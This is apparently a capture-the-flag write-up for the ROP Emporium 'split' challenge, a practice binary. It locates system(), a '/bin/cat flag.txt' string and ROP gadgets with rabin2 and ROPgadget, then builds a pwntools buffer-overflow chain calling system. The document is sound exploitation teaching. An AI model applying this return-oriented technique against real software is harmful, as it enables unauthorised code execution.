# SPLIT

[split](https://ropemporium.com/challenge/split.html)

Unlike the ret2win challenge, we no longer have a convenient `ret2win` function to return into. However, we do have access to a very powerful function called `system` that is dynamically linked by the `split` program from libc at this location: 0x400560.

```
$ rabin2 -i ./split
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf
```

According to the [manpage](https://man7.org/linux/man-pages/man3/system.3.html) for `system()`, it runs a shell command as a fork. This command must be passed as a string as the first argument to this function.

But first, what command should we pick to print out the flag?

The `split` webpage provides a helpful hint to find a string `"/bin/cat flag.txt"` that is present in the `split` binary. We can find the location of this string using the following command:

```
$ rabin2 -z ./split 
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

If we take a look at this line of output from this command, we find the important string we need. We can then save its virtual address (0x601060) for use later.

Let's take stock of what we have now. We have the address of `system()` (0x400560) and the address of the `"/bin/cat flag.txt"` string (0x601060). We already know how to return to a function that takes no arguments in `ret2win`, but how do we pass one argument to a function in return oriented programming?

Based on what I've read on *Wikipedia*, x86_64 Linux uses the [System V AMD64 ABI](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI) to pass arguments to functions. From the table, we can see that the first argument should be stored in the `rdi` register. This means that we have to somehow get 0x601060 into the `rdi` register before we call `system()`. This requires the use of a gadget that pops `0x601060` into `rdi` from the stack.

```
$ ROPgadget --binary ./split | grep "pop rdi"  
0x00000000004007c3 : pop rdi ; ret
```

Don't forget the gadget for returning to a function.

```
$ ROPgadget --binary ./split | grep ": ret$"
0x000000000040053e : ret
```

Now that we have found an appropriate gadget, we can now formulate our buffer overflow. Remember, the location of the saved RIP is still 0x28 (40) bytes from the start of the buffer.

```python
# ./win.py
from pwn import *
...
attack = b"A"*0x28 # garbage
attack += p64(0x4007c3) # pop rdi gadget
attack += p64(0x601060) # location of /bin/cat flag.txt
attack += p64(0x40053e) # ret gadget
attack += p64(0x400560) # system()
io.sendline(attack)
...
```

And that's it for this challenge.